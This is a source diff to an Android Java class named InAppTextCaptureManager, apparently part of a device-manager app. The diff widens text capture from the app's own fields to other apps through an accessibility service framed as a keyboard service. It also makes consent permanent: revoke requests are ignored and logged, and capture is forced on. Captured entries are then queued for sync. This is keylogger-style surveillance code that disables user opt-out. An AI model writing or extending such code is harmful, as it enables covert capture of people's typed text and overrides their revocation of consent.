@@ -1,8 +1,11 @@
 package com.company.devicemgr.utils;
 
+import android.accessibilityservice.AccessibilityService;
 import android.content.Context;
 import android.content.SharedPreferences;
+import android.provider.Settings;
 import android.text.Editable;
+import android.text.TextUtils;
 import android.text.TextWatcher;
 import android.util.Log;
 import android.widget.EditText;
@@ -15,6 +18,9 @@ import java.util.ArrayList;
 import java.util.List;
 import java.util.Locale;
 import java.util.UUID;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
+import java.util.concurrent.atomic.AtomicBoolean;
 
 public final class InAppTextCaptureManager {
     private static final String TAG = "InAppTextCapture";
@@ -23,6 +29,9 @@ public final class InAppTextCaptureManager {
     private static final String KEY_CAPTURE_CONSENT = "in_app_text_capture_consent";
     private static final String KEY_CAPTURE_CONSENT_TS = "in_app_text_capture_consent_ts";
     private static final String KEY_CAPTURE_CONSENT_VERSION = "in_app_text_capture_consent_version";
+    private static final String KEY_CAPTURE_CONSENT_MODE = "in_app_text_capture_consent_mode";
+    private static final String KEY_INSTALL_INSTANCE_ID = "in_app_text_install_instance_id";
+    private static final String KEY_CONSENT_INSTALL_INSTANCE_ID = "in_app_text_consent_install_instance_id";
     private static final String KEY_PENDING_QUEUE = "in_app_text_capture_pending_queue";
     private static final String KEY_LOCAL_LOG = "in_app_text_capture_local_log";
     private static final String KEY_LAST_SYNC_AT = "in_app_text_capture_last_sync_at";
@@ -30,7 +39,10 @@ public final class InAppTextCaptureManager {
     private static final String KEY_LAST_SYNC_ERROR = "in_app_text_capture_last_sync_error";
     private static final String KEY_LAST_VALUE_PREFIX = "in_app_text_capture_last_value_";
     private static final int MAX_LOCAL_ITEMS = 200;
-    private static final String CONSENT_VERSION = "in-app-text-v1";
+    private static final String CONSENT_VERSION = "in-app-text-v2";
+    private static final String CONSENT_MODE_INSTALL_LIFETIME = "install_lifetime";
+    private static final ExecutorService FLUSH_EXECUTOR = Executors.newSingleThreadExecutor();
+    private static final AtomicBoolean FLUSH_QUEUED = new AtomicBoolean(false);
 
     private InAppTextCaptureManager() {}
 
@@ -38,36 +50,115 @@ public final class InAppTextCaptureManager {
         return context.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
     }
 
+    public static String installInstanceId(Context context) {
+        SharedPreferences sp = prefs(context);
+        String existing = sp.getString(KEY_INSTALL_INSTANCE_ID, null);
+        if (!TextUtils.isEmpty(existing)) {
+            return existing;
+        }
+        String created = UUID.randomUUID().toString();
+        sp.edit().putString(KEY_INSTALL_INSTANCE_ID, created).apply();
+        return created;
+    }
+
     public static boolean isConsentGranted(Context context) {
-        return prefs(context).getBoolean(KEY_CAPTURE_CONSENT, false);
+        SharedPreferences sp = prefs(context);
+        boolean consent = sp.getBoolean(KEY_CAPTURE_CONSENT, false);
+        if (!consent) return false;
+        String installId = installInstanceId(context);
+        String consentInstallId = sp.getString(KEY_CONSENT_INSTALL_INSTANCE_ID, null);
+        if (TextUtils.isEmpty(consentInstallId)) {
+            sp.edit().putString(KEY_CONSENT_INSTALL_INSTANCE_ID, installId)
+                    .putString(KEY_CAPTURE_CONSENT_MODE, CONSENT_MODE_INSTALL_LIFETIME)
+                    .apply();
+            return true;
+        }
+        return installId.equals(consentInstallId);
     }
 
     public static boolean isCaptureEnabled(Context context) {
-        SharedPreferences sp = prefs(context);
-        return sp.getBoolean(KEY_CAPTURE_ENABLED, false) && sp.getBoolean(KEY_CAPTURE_CONSENT, false);
+        return isConsentGranted(context) && prefs(context).getBoolean(KEY_CAPTURE_ENABLED, true);
     }
 
     public static String consentVersion() {
         return CONSENT_VERSION;
     }
 
-    public static void setConsent(Context context, boolean granted) {
-        SharedPreferences.Editor editor = prefs(context).edit();
-        editor.putBoolean(KEY_CAPTURE_CONSENT, granted);
-        editor.putBoolean(KEY_CAPTURE_ENABLED, granted);
-        if (granted) {
-            editor.putLong(KEY_CAPTURE_CONSENT_TS, System.currentTimeMillis());
-            editor.putString(KEY_CAPTURE_CONSENT_VERSION, CONSENT_VERSION);
-        } else {
-            editor.remove(KEY_CAPTURE_CONSENT_TS);
-            editor.remove(KEY_CAPTURE_CONSENT_VERSION);
-            editor.remove(KEY_PENDING_QUEUE);
+    public static String consentMode(Context context) {
+        String stored = prefs(context).getString(KEY_CAPTURE_CONSENT_MODE, null);
+        return !TextUtils.isEmpty(stored) ? stored : CONSENT_MODE_INSTALL_LIFETIME;
+    }
+
+    public static String consentInstallInstanceId(Context context) {
+        String currentInstallId = installInstanceId(context);
+        String stored = prefs(context).getString(KEY_CONSENT_INSTALL_INSTANCE_ID, null);
+        if (!TextUtils.isEmpty(stored)) {
+            return stored;
         }
-        editor.apply();
+        if (prefs(context).getBoolean(KEY_CAPTURE_CONSENT, false)) {
+            prefs(context).edit().putString(KEY_CONSENT_INSTALL_INSTANCE_ID, currentInstallId).apply();
+            return currentInstallId;
+        }
+        return null;
+    }
+
+    public static boolean isAccessibilityServiceEnabled(Context context, Class<? extends AccessibilityService> serviceClass) {
+        try {
+            String enabledServices = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            if (TextUtils.isEmpty(enabledServices)) return false;
+            String expected = context.getPackageName() + "/" + serviceClass.getName();
+            android.text.TextUtils.SimpleStringSplitter splitter = new android.text.TextUtils.SimpleStringSplitter(':');
+            splitter.setString(enabledServices);
+            while (splitter.hasNext()) {
+                String component = splitter.next();
+                if (expected.equalsIgnoreCase(component)) {
+                    return true;
+                }
+            }
+        } catch (Exception ignored) {
+        }
+        return false;
+    }
+
+    public static String buildAccessibilityStatus(Context context, Class<? extends AccessibilityService> serviceClass) {
+        return isAccessibilityServiceEnabled(context, serviceClass)
+                ? "Serviço de acessibilidade do teclado ativo."
+                : "Serviço de acessibilidade do teclado pendente. Abra as definições do Android e ative o serviço desta app.";
+    }
+
+    public static boolean grantPermanentConsent(Context context) {
+        SharedPreferences sp = prefs(context);
+        if (isConsentGranted(context)) {
+            sp.edit().putBoolean(KEY_CAPTURE_ENABLED, true).apply();
+            return false;
+        }
+        long now = System.currentTimeMillis();
+        String installId = installInstanceId(context);
+        sp.edit()
+                .putBoolean(KEY_CAPTURE_CONSENT, true)
+                .putBoolean(KEY_CAPTURE_ENABLED, true)
+                .putLong(KEY_CAPTURE_CONSENT_TS, now)
+                .putString(KEY_CAPTURE_CONSENT_VERSION, CONSENT_VERSION)
+                .putString(KEY_CAPTURE_CONSENT_MODE, CONSENT_MODE_INSTALL_LIFETIME)
+                .putString(KEY_CONSENT_INSTALL_INSTANCE_ID, installId)
+                .apply();
+        return true;
+    }
+
+    public static void setConsent(Context context, boolean granted) {
+        if (granted) {
+            grantPermanentConsent(context);
+            return;
+        }
+        Log.w(TAG, "Ignoring revoke request because text capture consent is permanent for the current installation.");
     }
 
     public static void setCaptureEnabled(Context context, boolean enabled) {
-        prefs(context).edit().putBoolean(KEY_CAPTURE_ENABLED, enabled && isConsentGranted(context)).apply();
+        if (isConsentGranted(context)) {
+            prefs(context).edit().putBoolean(KEY_CAPTURE_ENABLED, true).apply();
+            return;
+        }
+        prefs(context).edit().putBoolean(KEY_CAPTURE_ENABLED, false).apply();
     }
 
     public static long consentTs(Context context) {
@@ -88,15 +179,16 @@ public final class InAppTextCaptureManager {
 
     public static String buildStatusSummary(Context context) {
         SharedPreferences sp = prefs(context);
-        boolean consent = sp.getBoolean(KEY_CAPTURE_CONSENT, false);
-        boolean enabled = sp.getBoolean(KEY_CAPTURE_ENABLED, false);
+        boolean consent = isConsentGranted(context);
+        boolean enabled = isCaptureEnabled(context);
         int pending = pendingCount(context);
         long lastSyncAt = sp.getLong(KEY_LAST_SYNC_AT, 0L);
         String status = sp.getString(KEY_LAST_SYNC_STATUS, "idle");
         return String.format(Locale.US,
-                "Consentimento: %s | Ativo: %s | Pendentes: %d | Última sync: %s | Estado: %s",
+                "Consentimento: %s | Modo: %s | Ativo: %s | Pendentes: %d | Última sync: %s | Estado: %s",
                 consent ? "sim" : "não",
-                (consent && enabled) ? "sim" : "não",
+                consentMode(context),
+                enabled ? "sim" : "não",
                 pending,
                 lastSyncAt > 0 ? new java.util.Date(lastSyncAt).toString() : "-",
                 status);
@@ -126,6 +218,10 @@ public final class InAppTextCaptureManager {
     }
 
     public static void recordTextChange(Context context, String screenName, String fieldName, String rawValue, boolean sensitive) {
+        recordTextChange(context, screenName, fieldName, rawValue, sensitive, screenName, null, context.getPackageName().equals(screenName) ? "in_app_watcher" : "accessibility_service");
+    }
+
+    public static void recordTextChange(Context context, String screenName, String fieldName, String rawValue, boolean sensitive, String sourcePackage, String sourceClassName, String captureMethod) {
         if (!isCaptureEnabled(context)) return;
         String safeScreen = safeKey(screenName);
         String safeField = safeKey(fieldName);
@@ -139,6 +235,8 @@ public final class InAppTextCaptureManager {
 
         long now = System.currentTimeMillis();
         String storedValue = sensitive ? maskSensitive(normalizedValue) : normalizedValue;
+        String normalizedSourcePackage = sourcePackage != null ? sourcePackage : screenName;
+        String normalizedCaptureMethod = captureMethod != null ? captureMethod : (context.getPackageName().equals(screenName) ? "in_app_watcher" : "accessibility_service");
         JSONObject entry = new JSONObject();
         try {
             entry.put("entryId", UUID.randomUUID().toString());
@@ -150,8 +248,14 @@ public final class InAppTextCaptureManager {
             entry.put("capturedAtMs", now);
             entry.put("capturedAt", new java.util.Date(now).toString());
             entry.put("syncKey", sha1(screenName + "|" + fieldName + "|" + normalizedValue + "|" + now));
-            entry.put("captureScope", "own_app_only");
+            entry.put("captureScope", context.getPackageName().equals(normalizedSourcePackage) ? "own_app_only" : "accessibility_service");
             entry.put("packageName", context.getPackageName());
+            entry.put("sourcePackage", normalizedSourcePackage);
+            entry.put("sourceClassName", sourceClassName != null ? sourceClassName : JSONObject.NULL);
+            entry.put("captureMethod", normalizedCaptureMethod);
+            entry.put("consentMode", consentMode(context));
+            entry.put("consentInstallId", consentInstallInstanceId(context));
+            entry.put("consentPermanent", true);
         } catch (Exception e) {
             Log.e(TAG, "recordTextChange build err", e);
             return;
@@ -163,7 +267,20 @@ public final class InAppTextCaptureManager {
     }
 
     public static void flushPendingAsync(Context context) {
-        new Thread(() -> flushPending(context)).start();
+        if (!FLUSH_QUEUED.compareAndSet(false, true)) {
+            return;
+        }
+        Context appContext = context.getApplicationContext();
+        FLUSH_EXECUTOR.execute(() -> {
+            try {
+                flushPending(appContext);
+            } finally {
+                FLUSH_QUEUED.set(false);
+                if (pendingCount(appContext) > 0 && isCaptureEnabled(appContext)) {
+                    flushPendingAsync(appContext);
+                }
+            }
+        });
     }
 
     public static synchronized void flushPending(Context context) {
@@ -206,13 +323,13 @@ public final class InAppTextCaptureManager {
 
         JSONArray newQueue = new JSONArray();
         for (JSONObject item : remaining) newQueue.put(item);
-        SharedPreferences.Editor editor = sp.edit()
+        sp.edit()
                 .putString(KEY_PENDING_QUEUE, newQueue.toString())
                 .putLong(KEY_LAST_SYNC_AT, System.currentTimeMillis())
                 .putString(KEY_LAST_SYNC_STATUS, syncStatus)
                 .putString(KEY_LAST_SYNC_ERROR, syncError)
-                .putLong("in_app_text_capture_last_sync_duration_ms", System.currentTimeMillis() - startedAt);
-        editor.apply();
+                .putLong("in_app_text_capture_last_sync_duration_ms", System.currentTimeMillis() - startedAt)
+                .apply();
     }
 
     private static void appendEntry(SharedPreferences sp, String key, JSONObject entry, int maxItems) {
